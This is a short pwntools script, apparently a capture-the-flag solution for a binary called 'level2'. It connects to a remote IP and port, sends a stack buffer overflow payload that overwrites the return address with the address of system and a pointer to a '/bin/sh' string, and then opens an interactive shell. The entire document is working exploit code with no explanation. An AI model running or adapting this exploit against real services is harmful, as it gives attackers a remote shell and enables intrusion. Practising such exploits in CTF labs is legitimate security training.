from pwn import *

#sh = process('./level2')
sh = remote('61.147.171.105', 55754)

system = 0x8048320
binsh = 0x804A024

payload = flat([b'a' * (0x88+4), system, b'a' * 4, binsh])

sh.sendline(payload)
sh.interactive()